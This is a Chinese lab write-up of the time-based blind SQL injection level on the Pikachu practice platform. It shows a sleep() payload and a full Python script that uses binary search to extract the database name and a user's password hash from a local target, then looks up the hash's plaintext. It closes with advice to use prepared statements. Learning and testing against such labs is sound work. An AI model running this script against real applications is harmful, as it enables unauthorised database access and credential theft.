【Pikachu】Web-SQL-Inject 盲注(base on time) Writeup

操作者：何芊宏 | 操作日期：2026.9.28 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, 时间盲注, Python, sleep, 二分查找

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称：盲注(base on time)
  • 目标：在页面无数据回显、无报错信息，且布尔盲注的“真/假”状态差异被抹除的情况下，利用时间延迟函数（sleep）和二分查找算法，自动化提取数据库名与管理员密码哈希。

2. 解题思路与知识点

漏洞原理：

时间盲注是盲注中最隐蔽、也是效率最低的一种形式。该关卡的后端代码在执行查询时，无论查询结果如何，页面返回的内容和状态码完全一致（不再提示“用户名存在”或“不存在”）。攻击者无法通过页面内容判断逻辑真假，只能通过构造带有 sleep() 函数的 SQL 语句，观察服务器响应时间的长短来推断数据。

工具选型与心路历程：
  • 源码分析：通过查看 `sqli_blind_t.php` 源码，确认页面无回显，且使用了 `mysqli_query` 不报错，唯一能利用的通道就是时间差。
  • Python 自动化脚本：由于每次猜解都需要等待固定的秒数，手工测试极不现实，必须编写 Python 脚本利用二分查找算法进行自动化遍历。
  • 编码陷阱复盘：在之前的布尔盲注中遭遇了 --+ 被编码为 --%2B 导致注释失败的坑，本次时间盲注脚本继续采用 -- （带空格）来规避。

3. 操作步骤

第一步：漏洞探测与页面特性分析

操作： 在页面分别输入 allen 和 allen' and 1=2 -- 观察响应时间。

Payload： allen' and if(1=1, sleep(3), 0)--

回显结果： 无论输入什么，页面始终显示相同的提示信息。但输入上述 payload 后，页面明显卡顿 3 秒才返回。证明 sleep() 函数被成功执行，时间盲注漏洞存在。

第二步：编写自动化时间盲注脚本

操作： 新建 sqli_blind_t.py，运行完整脚本。

完整代码：

import requests
import time

url = "http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php"
real_username = "allen"

# 延迟阈值（秒）。如果响应时间超过 2 秒，我们就认为条件为真。
# 这里的 2 必须小于我们设置的 sleep 时间（这里是 3）
TIME_THRESHOLD = 2.0  

def check_condition(condition):
    # 核心格式：allen' and if(条件, sleep(3), 0)-- 
    # 依然采用 -- (带空格) 来避开 requests 的编码陷阱
    payload = f"{real_username}' and if({condition}, sleep(3), 0)-- "
    params = {"name": payload, "submit": "查询"}
    
    start_time = time.time()
    try:
        requests.get(url, params=params, timeout=10)
    except Exception as e:
        print(f"[-] 请求超时或异常: {e}")
        return False
    elapsed = time.time() - start_time
    
    return elapsed > TIME_THRESHOLD

def get_length(sql_query):
    for length in range(1, 50):
        if check_condition(f"length(({sql_query}))={length}"):
            return length
    return 0

def get_data(sql_query):
    length = get_length(sql_query)
    if length == 0: return ""
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if check_condition(f"ascii(substr(({sql_query}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"[*] 正在猜解: {result}")
    return result

if __name__ == "__main__":
    print("[*] 开始时间盲注提取数据库名...")
    db_name = get_data("select database()")
    print(f"\n[+] 成功提取到数据库名: {db_name}")
    
    print("\n[*] 开始提取第一个用户的密码...")
    pw_hash = get_data("select pw from member limit 0,1")
    print(f"\n[+] 成功提取到密码哈希: {pw_hash}")

第三步：核心原理深度解析（满足你的好奇心）

1. 时间盲注的核心逻辑是什么？

它的本质是：利用时间差作为信息传递的载体。我们通过构造 if(condition, sleep(3), 0) 这样的语句，让数据库自己判断。如果条件成立（为真），它就睡 3 秒；如果条件不成立（为假），它立刻返回。我们通过测量 HTTP 请求的耗时，就能反推出条件的真假。

2. 代码里的 `check_condition` 函数是怎么工作的？

它接收一个条件（比如 ascii(substr(...)) > 100），拼接到 SQL 语句中发送给服务器。然后记录请求前后的时间戳，如果耗时超过预设的阈值（这里设为 2 秒），就说明数据库执行了 sleep(3)，即条件为真；否则为假。

3. 为什么要用“二分查找”？

因为每问一次问题都需要消耗一次 HTTP 请求（并且要等几秒），如果从 ASCII 32 一直遍历到 126，每个字符最多要猜 95 次，极其耗时。二分查找将范围从 32-126 每次砍半，最多只需 7 次就能猜出一个字符。这是提升脚本效率的核心算法。

4. 为什么 payload 末尾要用 `-- ` 而不是 `--+`？

因为 Python 的 requests 库在发送参数时，会对 + 进行 URL 编码，变成 %2B。而 MySQL 的注释符 -- 后面必须紧跟空格（或控制字符）才能生效，--%2B 无法被识别为注释，会导致 SQL 语法错误，sleep 函数永远不会被执行，脚本就会因为不断返回“假”而卡死。改用 -- （带空格），requests 会自动编码为 --%20，从而成功注释掉尾部。

第四步：执行结果与 MD5 解密

回显结果：

  • 数据库名：[+] 成功提取到数据库名: pikachu
  • 密码哈希：[+] 成功提取到密码哈希: e10adc3949ba59abbe56e057f20f883e

解密验证： 将提取到的哈希 e10adc3949ba59abbe56e057f20f883e 放入 cmd5.com 进行查询，结果显示明文密码为 123456。

4. 踩坑记录与复盘

  • 坑1：源码限制导致查询结果异常。 源码中存在 mysqli_num_rows($result)==1，这意味着如果使用 or 1=1 会导致结果集超过 1 行，页面依然报“不存在”。解决方案是必须使用真实存在的唯一用户名（如 allen），并在 Payload 中用 and 连接逻辑。
  • 坑2：Python requests 的 URL 编码陷阱（致命）。 在构造 URL 参数时，Python 的 requests 库会将 + 编码为 %2B，而 MySQL 的注释符 -- 后必须跟空格才能生效。这导致 SQL 语法错误，页面始终返回“不存在”。解决方案是将 Payload 末尾的 --+ 改为 -- （带空格），此时 requests 会将其正确编码为 --%20，MySQL 即可正确注释尾部。
  • 坑3：盲注效率问题。 人工手动逐个字符测试效率极低。使用 Python 脚本配合二分查找算法，将每个字符的猜测次数从最多 95 次（遍历 ASCII）降低到最多 7 次，极大提升了自动化效率。

5. 知识总结

  • 时间盲注核心： 在无回显、无报错的场景下，利用 if(condition, sleep(N), 0) 函数让数据库“睡”几秒，通过测量响应时间来判断数据。
  • 二分查找算法： 在盲注中，通过 ascii(substr(...)) > mid 的方式快速缩小 ASCII 范围，是编写高效盲注脚本的必备技能。
  • 防御建议： 严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与 SQL 语句代码分离；避免使用动态拼接字符串的方式执行 SQL。
